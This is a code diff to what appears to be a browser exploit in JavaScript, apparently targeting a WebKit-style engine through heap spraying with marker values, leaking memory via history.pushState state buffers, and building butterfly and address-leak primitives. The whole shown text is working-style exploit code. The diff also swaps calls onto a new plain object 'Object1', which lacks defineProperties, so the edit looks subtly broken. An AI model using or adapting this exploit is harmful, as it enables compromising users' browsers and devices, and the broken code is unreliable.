@@ -139,14 +139,15 @@ var props={};for(var i=0;i<16384/2;){
 props[i++]={value:1111638594};
 props[i++]={value:tgt};
 };
-var history =new Objet();
+var history =new Object();
+  var Object1 = new Object();
 var foundLeak=undefined;
 var foundIndex=0;
 var maxCount=256;
 while(foundLeak==undefined&&maxCount>0){
 maxCount--;
 history.pushState(y,"");
-Object.defineProperties({},props);
+Object1.defineProperties({},props);
 var leak=new Uint32Array(history.state.data.buffer);
 for(var i=0;i<leak.length-6;i++){
 if(leak[i]==1111638594&&leak[i+1]==4294901760&&leak[i+2]==0&&leak[i+3]==0&&leak[i+4]==0&&leak[i+5]==0&&leak[i+6]==14&&leak[i+7]==0&&leak[i+10]==0&&leak[i+11]==0&&leak[i+12]==0&&leak[i+13]==0&&leak[i+14]==14&&leak[i+15]==0){
@@ -179,7 +180,7 @@ c[0]=0;
 tgt.c=c;
 hax[2]=0;
 hax[3]=0;
-Object.defineProperty(Array.prototype,100,{get:undefined});
+Object1.defineProperty(Array.prototype,100,{get:undefined});
 tgt.c=leakval_helper;
 var butterfly=new int64(hax[2],hax[3]);
 butterfly.low+=16;tgt.c=leakval_u32;
